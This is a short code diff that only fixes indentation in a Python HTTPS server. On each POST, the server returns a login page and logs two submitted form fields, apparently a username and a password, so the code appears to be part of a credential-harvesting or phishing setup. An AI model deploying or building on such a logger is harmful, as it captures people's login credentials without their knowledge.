@@ -39,8 +39,8 @@ class HTTPHandler(SimpleHTTPRequestHandler):
 	def do_POST(self):
 		content_length = int(self.headers.get('Content-Length', 0))
 		config_string = self.rfile.read(content_length).decode("UTF-8")
-        self.path = '/login.html'
-        index1 = config_string.find('=')
+		self.path = '/login.html'
+		index1 = config_string.find('=')
 		index2 = config_string.find('&')
 		index3 = config_string.rfind('&')
 		http_get_logger.info(f'{config_string[index1+1:index2]}\t{config_string[index2+10:index3]}')
@@ -51,5 +51,5 @@ class HTTPHandler(SimpleHTTPRequestHandler):
 def run(server_class=HTTPServer, handler_class=HTTPHandler):
 	server_address = ('', 443)
 	httpd = server_class(server_address, handler_class)
-    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='localhost.pem', ssl_version=ssl.PROTOCOL_TLS)
+	httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='localhost.pem', ssl_version=ssl.PROTOCOL_TLS)
 	httpd.serve_forever()
